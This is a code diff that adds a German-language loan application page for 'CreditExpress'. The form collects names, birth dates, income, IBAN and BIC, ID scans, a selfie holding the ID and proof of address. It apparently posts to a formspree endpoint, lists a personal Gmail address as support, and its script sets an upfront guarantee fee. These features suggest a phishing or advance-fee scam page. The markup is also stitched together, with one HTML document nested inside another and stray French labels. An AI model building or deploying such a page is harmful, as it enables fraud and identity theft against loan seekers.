@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <title>CreditExpress</title>
+    <link rel="stylesheet" href="./style.css">
+
+  </head>
+    
+  <body>
+  <!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kreditantrag - CreditExpress</title>
+    <style>
+        /* ==== CSS ==== */
+        :root {
+            --primary-color: #1e40af;
+            --accent-color: #059669;
+            --background: #ffffff;
+            --foreground: #0f172a;
+            --muted: #f1f5f9;
+            --muted-foreground: #64748b;
+            --border: #e2e8f0;
+            --destructive: #ef4444;
+            --radius: 0.5rem;
+            --shadow: 0 1px 3px rgb(0 0 0 / 0.1);
+            --shadow-lg: 0 10px 15px rgb(0 0 0 / 0.1);
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:'Inter',sans-serif; line-height:1.6; background:var(--background); color:var(--foreground); }
+        .container { max-width:1200px; margin:0 auto; padding:0 1rem; }
+        .header { background:white; border-bottom:1px solid var(--border); box-shadow:var(--shadow); position:sticky; top:0; z-index:50; }
+        .header-content { display:flex; justify-content:space-between; align-items:center; height:4rem; }
+        .logo h1 { color:var(--primary-color); font-size:1.5rem; font-weight:bold; cursor:pointer; }
+        .nav-desktop { display:flex; align-items:center; gap:1rem; }
+        .nav-link { color:var(--muted-foreground); text-decoration:none; padding:0.5rem 0.75rem; border-radius:var(--radius); background:none; border:none; cursor:pointer; font-size:0.875rem; }
+        .nav-link:hover { color:var(--primary-color); }
+        .mobile-menu-btn { display:none; background:none; border:none; cursor:pointer; font-size:1.2rem; color:var(--foreground); }
+        .mobile-menu { display:none; position:absolute; top:100%; right:0; left:0; background:white; border-top:1px solid var(--border); box-shadow:var(--shadow-lg); padding:1rem; flex-direction:column; gap:0.5rem; z-index:40; }
+        .mobile-menu.active { display:flex; }
+        .mobile-nav-link { color:var(--muted-foreground); text-decoration:none; padding:0.75rem; border-radius:var(--radius); background:none; border:none; cursor:pointer; text-align:left; width:100%; }
+        .mobile-nav-link:hover { color:var(--primary-color); }
+
+        .btn { padding:0.75rem 1.5rem; border-radius:var(--radius); cursor:pointer; font-weight:500; border:none; transition:0.2s all; }
+        .btn-primary { background-color:var(--primary-color); color:#fff; }
+        .btn-primary:hover { background-color:#1d4ed8; }
+        .btn-secondary { background-color:var(--muted); color:var(--foreground); }
+        .btn-secondary:hover { background-color:#e2e8f0; }
+
+        .application-form-container { background-color: var(--muted); padding:4rem 1rem; }
+        .calculator-card { background-color:var(--background); padding:2rem; border-radius:var(--radius); box-shadow:var(--shadow-lg); max-width:64rem; margin:0 auto; }
+        .calculator-card h2 { text-align:center; font-size:2rem; margin-bottom:2rem; color:var(--primary-color); }
+
+        .form-grid { display:grid; grid-template-columns:1fr 1fr; gap:1.5rem; margin-bottom:1.5rem; }
+        .form-group { display:flex; flex-direction:column; }
+        .form-group label { font-weight:600; margin-bottom:0.5rem; }
+        .form-group input, .form-group select { padding:0.75rem; border:1px solid var(--border); border-radius:var(--radius); font-size:1rem; background-color: var(--background);}
+        .form-group input:focus, .form-group select:focus { outline:none; border-color:var(--primary-color); box-shadow:0 0 0 3px rgba(30,64,175,0.1);}
+        .form-group input[type="file"] { padding:0.5rem; }
+
+        .checkbox-container { display:flex; align-items:flex-start; gap:0.75rem; padding:1rem; border:1px solid var(--border); border-radius:var(--radius); background: var(--background); margin:1.5rem 0; }
+        .checkbox-container input[type="checkbox"] { margin-top:0.2rem; }
+
+        .form-actions-grid { display:flex; justify-content:center; gap:1rem; margin-top:2rem; }
+
+        .loading-spinner { width:1rem; height:1rem; border:2px solid var(--muted); border-top:2px solid var(--primary-color); border-radius:50%; animation:spin 1s linear infinite; display:inline-block; vertical-align:middle; margin-right:0.5rem; }
+        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+
+        @media (max-width:768px) { .form-grid { grid-template-columns:1fr; } .form-actions-grid { flex-direction:column; } .nav-desktop { display:none; } .mobile-menu-btn { display:block; } }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container header-content">
+            <div class="logo"><h1 onclick="goToPage('index.html')">CreditExpress</h1></div>
+            <nav class="nav-desktop">
+                <a href="index.html" class="nav-link">Startseite</a>
+                <a href="#" class="nav-link">Unsere Angebote</a>
+                <button onclick="sendEmail('contact')" class="nav-link">Kontakt</button>
+                <button onclick="sendEmail('support')" class="btn btn-primary">Support</button>
+            </nav>
+            <button class="mobile-menu-btn" onclick="toggleMobileMenu()">☰</button>
+        </div>
+        <div id="mobileMenu" class="mobile-menu">
+            <a href="index.html" class="mobile-nav-link">Startseite</a>
+            <a href="#" class="mobile-nav-link">Unsere Angebote</a>
+            <button onclick="sendEmail('contact')" class="mobile-nav-link">Kontakt</button>
+            <button onclick="sendEmail('support')" class="mobile-nav-link btn btn-primary">Support</button>
+        </div>
+    </header>
+
+    <!-- Formulaire -->
+    <main class="application-form-container">
+        <div class="calculator-card">
+            <h2>Persönliche Informationen</h2>
+            <form id="applicationForm" action="https://formspree.io/f/xqaypgyg" method="POST" enctype="multipart/form-data">
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="civility">Anrede *</label>
+                        <select id="civility" name="civility" required>
+                            <option value="">Auswählen</option>
+                            <option value="M">Herr</option>
+                            <option value="Mme">Frau</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="firstName">Vorname *</label>
+                        <input type="text" id="firstName" name="firstName" placeholder="Ihr Vorname" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="lastName">Nachname *</label>
+                        <input type="text" id="lastName" name="lastName" placeholder="Ihr Nachname" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="birthDate">Geburtsdatum *</label>
+                        <input type="date" id="birthDate" name="birthDate" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Email *</label>
+                        <input type="email" id="email" name="email" placeholder="ihre@email.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="phone">Telefon *</label>
+                        <input type="tel" id="phone" name="phone" placeholder="0123 456789" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="address">Adresse *</label>
+                    <input type="text" id="address" name="address" placeholder="Ihre vollständige Adresse" required>
+                </div>
+
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="postalCode">Postleitzahl *</label>
+                        <input type="text" id="postalCode" name="postalCode" placeholder="12345" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="city">Stadt *</label>
+                        <input type="text" id="city" name="city" placeholder="Ihre Stadt" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="profession">Beruf *</label>
+                        <input type="text" id="profession" name="profession" placeholder="Ihr Beruf" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="monthlyIncome">Monatliches Einkommen *</label>
+                        <input type="number" id="monthlyIncome" name="monthlyIncome" placeholder="2500" required>
+                    </div>
+                </div>
+
+                <h3 class="form-section-title">Bankinformationen</h3>
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="iban">IBAN *</label>
+                        <input type="text" id="iban" name="iban" placeholder="DE89 3704 0044 0532 0130 00" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="bic">BIC *</label>
+                        <input type="text" id="bic" name="bic" placeholder="COBADEFFXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="accountHolder">Kontoinhaber *</label>
+                        <input type="text" id="accountHolder" name="accountHolder" placeholder="Name des Kontoinhabers" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="bankName">Bankname *</label>
+                        <input type="text" id="bankName" name="bankName" placeholder="Name Ihrer Bank" required>
+                    </div>
+                </div>
+
+                <h3 class="form-section-title">Belege</h3>
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="idCard">Personalausweis oder Reisepass *</label>
+                        <input type="file" id="idCard" name="idCard" accept="image/*" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="selfie">Selfie-Foto mit Ausweis in der Hand *</label>
+                        <input type="file" id="selfie" name="selfie" accept="image/*" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="proofOfAddress">Wohnsitznachweis *</label>
+                        <input type="file" id="proofOfAddress" name="proofOfAddress" accept="image/*" required>
+                    </div>
+                </div>
+
+                <div class="checkbox-container">
+                    <input type="checkbox" id="acceptTerms" name="acceptTerms" required>
+                    <label for="acceptTerms">Ich akzeptiere die Datenschutzbestimmungen und AGB *</label>
+                </div>
+
+                <div class="form-actions-grid">
+                    <button type="submit" class="btn btn-primary">Antrag absenden</button>
+                    <button type="button" onclick="newApplication()" class="btn btn-secondary">Neuer Antrag</button>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        /* ==== JS ==== */
+        let currentLoanData = { projectType:'', requestedAmount:15000, guaranteeRate:7, guaranteeTax:1050, netAmount:13950 };
+        document.addEventListener('DOMContentLoaded', function() { initializeMobileMenu(); initializeApplicationForm(); });
+
+        function goToPage(page) { window.location.href = page; }
+        function initializeMobileMenu() {
+            const btn=document.querySelector('.mobile-menu-btn'), menu=document.getElementById('mobileMenu');
+            if(btn && menu){ btn.addEventListener('click', e=>{ e.stopPropagation(); menu.classList.toggle('active'); });
+            document.addEventListener('click', e=>{ if(!menu.contains(e.target)&&!btn.contains(e.target)){ menu.classList.remove('active'); }});
+            document.querySelectorAll('.mobile-nav-link').forEach(link=>{link.addEventListener('click',()=>menu.classList.remove('active'))});}
+        }
+        function toggleMobileMenu(){document.getElementById('mobileMenu').classList.toggle('active');}
+
+        function initializeApplicationForm(){
+            const form=document.getElementById('applicationForm'); if(form){ form.addEventListener('submit',handleApplicationSubmit);}
+        }
+        function handleApplicationSubmit(e){
+            e.preventDefault();
+            const form=e.target, requiredFields=form.querySelectorAll('[required]'), formData=new FormData(form);
+            let isValid=true;
+            requiredFields.forEach(f=>{
+                if(!f.value.trim() && f.type!=='checkbox'){ f.style.borderColor='var(--destructive)'; isValid=false; }
+                else if(f.type==='checkbox' && !f.checked){ f.parentElement.style.borderColor='var(--destructive)'; isValid=false; }
+                else { f.style.borderColor='var(--border)'; if(f.type==='checkbox'){f.parentElement.style.borderColor='var(--border)';} }
+            });
+            if(!isValid){ alert('Bitte füllen Sie alle erforderlichen Felder aus.'); return; }
+            const submitBtn=form.querySelector('button[type="submit"]'); submitBtn.innerHTML='<div class="loading-spinner"></div>Wird bearbeitet...'; submitBtn.disabled=true;
+            const applicationData={ ...JSON.parse(localStorage.getItem('loanData')||'{}'),
+                civility: form.civility.value, firstName: form.firstName.value, lastName: form.lastName.value,
+                birthDate: form.birthDate.value, email: form.email.value, phone: form.phone.value,
+                address: form.address.value, postalCode: form.postalCode.value, city: form.city.value,
+                profession: form.profession.value, monthlyIncome: parseInt(form.monthlyIncome.value),
+                iban: form.iban.value, bic: form.bic.value, accountHolder: form.accountHolder.value,
+                bankName: form.bankName.value, idCard: form.idCard.files[0]?.name||'', selfie: form.selfie.files[0]?.name||'',
+                proofOfAddress: form.proofOfAddress.files[0]?.name||'', acceptTerms: form.acceptTerms.checked,
+                submissionDate: new Date().toISOString(), applicationId:'CR-'+Date.now() };
+            setTimeout(()=>{ localStorage.setItem('applicationData',JSON.stringify(applicationData));
+                localStorage.removeItem('loanData'); goToPage('success.html'); },2000);
+        }
+
+        function sendEmail(type){
+            const email='enricamassonef@gmail.com'; let subject, body;
+            if(type==='contact'){ subject='Kontaktanfrage - CreditExpress'; body='Hallo,\n\nIch möchte zusätzliche Informationen über Ihre Kreditdienstleistungen erhalten.\n\nMit freundlichen Grüßen,'; }
+            else{ subject='Support-Anfrage - CreditExpress'; body='Hallo,\n\nIch benötige Hilfe bezüglich:\n\n[Beschreiben Sie Ihr Problem]\n\nMit freundlichen Grüßen,'; }
+            window.location.href=`mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+        }
+        function newApplication(){ localStorage.removeItem('loanData'); localStorage.removeItem('applicationData'); goToPage('index.html');}
+    </script>
+</body>
+</html>
+    <script  src="./script.js"></script>
+
+  </body>
+  
+</html>
